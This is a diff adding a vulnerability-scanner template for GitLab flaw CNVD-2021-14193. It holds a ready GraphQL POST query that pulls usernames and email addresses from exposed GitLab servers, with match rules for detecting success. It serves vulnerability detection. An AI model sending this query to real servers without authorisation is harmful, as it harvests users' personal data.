@@ -1,0 +1,31 @@
+app: GitLab
+query: body:"GitLab"
+meta:
+  name: Gitlab CNVD-2021-14193 InfoLeak
+  level: 4
+  tags:
+    - information_leakage
+  description: GitLab中存在Graphql接口 输入构造的数据时会泄露用户邮箱和用户名
+  homepage: https://about.gitlab.com/
+  author: 一曲成殇
+  references: https://www.cnvd.org.cn/flaw/show/CNVD-2021-14193
+  solution: 升级系统版本或参考https://gitlab.com/gitlab-org/gitlab/-/issues/244275
+  steps:
+    verify_steps:
+      type: and
+      verify:
+        - request:
+            method: POST
+            path: /api/graphql
+            redirect: true
+            header:
+              - Content-Type: application/json
+            params: '{"query":"{\nusers {\nedges {\n node {\n username\n email\n avatarUrl\n status {\n emoji\n message\n messageHtml\n }\n }\n }\n }\n }","variables":null,"operationName":null}'
+          response:
+            - name: body
+              value: avatarUrl
+              type: contains
+            - name: code
+              value: "200"
+              type: equals
+  create_at: "2021-11-09 17:28:41"
